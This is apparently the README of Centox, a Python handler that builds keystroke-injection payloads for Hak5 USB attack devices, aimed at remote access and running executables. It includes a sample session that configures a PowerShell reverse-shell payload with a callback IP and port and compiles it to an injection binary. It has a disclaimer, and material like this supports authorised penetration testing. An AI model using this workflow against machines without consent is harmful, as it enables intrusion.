<div align="center">
    <img src="logo.png" height="200">
</div>

<h1 align="center">
  Centox
</h1>

Centox is an injection handler written in python3 and is designed to generate keystroke injection payloads
to deploy using a [USB Rubber ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe/),
[O.MG Cable](https://shop.hak5.org/products/omg-cable) or
[Bash Bunny](https://shop.hak5.org/products/bash-bunny) which was all designed by [Hak5](https://shop.hak5.org/).
Each payload was originally written for the rubber ducky but can be converted to 3 formats: ducky, bunny and omg.
This project contains payloads designed for establishing remote access, deploying and running executables and
more in as short time as possible. Centox comes with payloads designed for Windows, Mac and Linux with the
assumption that the target has not modified their default shortcuts.

## Disclaimer

This project was designed for educational purposes __ONLY__ and is not to be used without explicit permission.
Hacking without permission is not encouraged and the author is not responsible for any illegal use of this tool.

## Compatibility
- [x] USB Rubber Ducky
- [x] O.MG Cable
- [x] Bash Bunny

## Installation

Downloading and running setup.py:
```
$ git clone https://github.com/Sigurd-Pettersen/Centox.git
$ sudo python3 Centox/setup.py
```
running setup.py will automatically generate a centox executable to be run in terminal.

## Usage
Starting the centox handler:
```
$ centox
```

the handler commands can be listed using the `help` command:
```
[Centox] $ help

Command    Description
---------  ---------------------------------------------
list       lists all available: payloads layouts formats
use        choose a payload to use
set        sets global or payload arguments
options    show all available arguments
generate   generates the current payload
help       shows this help message
```

how to generate payloads:
```
[Centox] $ use windows/shell/powershell

[Centox] $ options

 Payload: windows/shell/powershell

Global Argument       Value
--------------------  -------
typing_delay_average
typing_delay_offset   25

Payload Argument    Value
------------------  -------
start_delay         500
ip
port
windows_admin       false

[Centox] $ set ip 192.168.68.42

[Centox] $ set port 9999

[Centox] $ generate -o /home/user/inject.bin -l no
[*] created temporary folder -> /tmp/tmpti0d_l1u
[*] converting payload to format: ducky
[*] writing raw payload to -> /tmp/tmpti0d_l1u/payload
[*] compiling payload to injection binary...
[*] injection compiled successfully -> /home/user/inject.bin
```
